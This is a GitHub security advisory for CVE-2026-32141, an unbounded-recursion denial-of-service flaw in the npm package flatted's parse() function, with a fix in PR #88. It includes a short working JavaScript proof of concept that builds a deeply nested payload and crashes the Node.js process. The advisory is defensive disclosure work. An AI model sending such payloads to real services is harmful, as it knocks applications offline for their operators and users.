# [H] flatted vulnerable to unbounded recursion DoS in parse() revive phase

## Summary
Severity: High
Advisory: GHSA-25h7-pfq9-p65f
CVE: CVE-2026-32141
CWE: CWE-674
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-25h7-pfq9-p65f
Type: github-advisory

## Affected
- npm: `flatted` — affected >=0 <3.4.0

## Details
## Summary

flatted's `parse()` function uses a recursive `revive()` phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential `$` indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.

## Impact

Denial of Service (DoS). Any application that passes untrusted input to `flatted.parse()` can be crashed by an unauthenticated attacker with a single request.

flatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.

## Proof of Concept

```javascript
const flatted = require('flatted');

// Build deeply nested circular reference chain
const depth = 20000;
const arr = new Array(depth + 1);
arr[0] = '{"a":"1"}';
for (let i = 1; i <= depth; i++) {
  arr[i] = `{"a":"${i + 1}"}`;
}
arr[depth] = '{"a":"leaf"}';

const payload = JSON.stringify(arr);
flatted.parse(payload); // RangeError: Maximum call stack size exceeded
```

## Fix

The maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive `revive()` to a stack-based loop.

## Affected Versions

All versions prior to the PR #88 fix.

## References
- https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f
- https://nvd.nist.gov/vuln/detail/CVE-2026-32141
- https://github.com/WebReflection/flatted/pull/88
- https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606
- https://github.com/WebReflection/flatted
